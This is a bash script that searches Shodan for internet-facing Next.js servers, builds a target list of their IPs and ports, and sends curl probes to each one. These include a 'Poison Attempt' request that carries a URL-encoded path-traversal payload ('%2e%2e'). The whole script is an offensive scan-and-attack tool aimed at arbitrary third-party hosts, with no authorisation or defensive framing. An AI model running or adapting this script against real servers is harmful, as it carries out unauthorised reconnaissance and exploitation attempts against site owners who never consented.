#!/bin/bash

# === Config ===
OUTPUT_FILE="nextjs_targets.txt"
TEMP_FILE="temp_shodan_results.txt"
MAX_RESULTS=25
PAYLOAD="%2e%2e"

# === Shodan Queries ===
declare -a QUERIES=(
    'http.html:"/_next/static/"'
    'http.html:"__NEXT_DATA__"'
    'http.title:"Next.js"'
    'http.headers.x-powered-by:"Next.js"'
    'http.html:"/_next/data/"'
)

# === Step 1: Search Shodan ===
echo "[*] Searching Shodan for potential Next.js targets..."

> "$TEMP_FILE"  # Clear temp file

for query in "${QUERIES[@]}"; do
    echo "[*] Running query: $query"
    shodan search --limit "$MAX_RESULTS" --fields ip_str,port "$query" 2>/dev/null >> "$TEMP_FILE"
done

# === Step 2: Deduplicate targets ===
sort -u "$TEMP_FILE" > "$OUTPUT_FILE"
TARGET_COUNT=$(wc -l < "$OUTPUT_FILE")

if [[ $TARGET_COUNT -eq 0 ]]; then
    echo "[!] No targets found. Try different queries or increase MAX_RESULTS."
    exit 1
fi

echo "[*] Found $TARGET_COUNT unique targets. Starting basic testing..."

# === Step 3: Test Each Target ===
while IFS= read -r line; do
    IP=$(echo "$line" | cut -d ' ' -f1)
    PORT=$(echo "$line" | cut -d ' ' -f2)

    [[ "$PORT" == "443" ]] && SCHEME="https" || SCHEME="http"
    BASE_URL="$SCHEME://$IP:$PORT"

    echo -e "\n[+] Testing $BASE_URL"

    curl -sk --max-time 5 "$BASE_URL/_next/data/test.json" -o /dev/null -w "[*] /_next/data/ => %{http_code}\n"
    curl -sk --max-time 5 "$BASE_URL/_next/static/buildManifest.js" -o /dev/null -w "[*] /buildManifest.js => %{http_code}\n"

    POISON_URL="$BASE_URL/$PAYLOAD/$PAYLOAD/$PAYLOAD/_next/data/test.json"
    curl -sk --max-time 5 "$POISON_URL" -o /dev/null -w "[*] Poison Attempt => %{http_code}\n"

done < "$OUTPUT_FILE"
